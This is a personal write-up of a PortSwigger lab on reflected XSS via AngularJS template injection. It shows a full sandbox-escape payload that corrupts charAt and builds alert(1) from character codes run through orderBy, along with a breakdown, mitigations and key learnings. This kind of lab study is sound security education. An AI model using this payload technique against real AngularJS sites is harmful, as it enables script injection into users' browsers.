# Lab24 - Reflected XSS With AngularJS Sandbox Escape Without Strings

## Objective

Exploit a Client-Side Template Injection (CSTI) vulnerability in AngularJS.

The application blocks string usage and attempts to enforce AngularJS sandbox restrictions.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSTI |
| Difficulty | Practitioner |
| Framework | AngularJS |
| Vulnerability | Sandbox Escape |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application evaluates attacker-controlled AngularJS expressions.

AngularJS attempts to prevent dangerous operations through its sandbox.

However, the sandbox can be bypassed.

---

# Analysis

## Step 1

Detect AngularJS

Payload:

```html
{{7*7}}
```

---

Result:

```text
49
```

---

Confirmed:

```text
AngularJS Evaluating Expressions
```

---

## Step 2

Identify Restrictions

Application blocks:

```text
Quoted Strings
```

---

Example:

```javascript
'text'
```

fails.

---

## Step 3

Need Sandbox Escape

AngularJS internally relies on:

```javascript
charAt()
```

during identifier validation.

---

## Step 4

Modify charAt()

Payload modifies:

```javascript
String.prototype.charAt
```

behavior.

---

# Full Payload(s) Used

```javascript
toString().constructor.prototype.charAt=[].join;
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

---

# Payload Breakdown

## Part 1

```javascript
toString().constructor.prototype.charAt=[].join
```

---

Replaces:

```javascript
charAt()
```

with:

```javascript
join()
```

---

This breaks AngularJS identifier validation.

---

## Part 2

```javascript
toString().constructor.fromCharCode(...)
```

---

Builds:

```javascript
x=alert(1)
```

without using quotes.

---

## Part 3

```javascript
[1]|orderBy:'PAYLOAD'
```

---

Forces AngularJS to evaluate payload.

---

# Why The Payload Works

Execution Flow:

```text
charAt() Corrupted
        ↓
Sandbox Validation Fails
        ↓
orderBy Executes Expression
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Verify AngularJS.

---

Used:

```html
{{7*7}}
```

---

Confirmed CSTI.

---

## Problem

Strings blocked.

---

## Key Observation

Sandbox depends on:

```javascript
charAt()
```

internally.

---

## Exploitation Strategy

Break AngularJS parser.

Generate payload dynamically.

Execute via:

```javascript
orderBy
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Upgrade AngularJS.

Avoid evaluating user-controlled expressions.

Use strict CSP.

---

# Related Theory

- 30-client-side-template-injection.md
- 31-angularjs-sandbox.md
- 32-angularjs-sandbox-escape.md

---

# Key Learnings

- AngularJS sandbox is not a security boundary.
- Internal functions can become attack vectors.
- String restrictions do not stop CSTI.
- orderBy is a powerful AngularJS sink.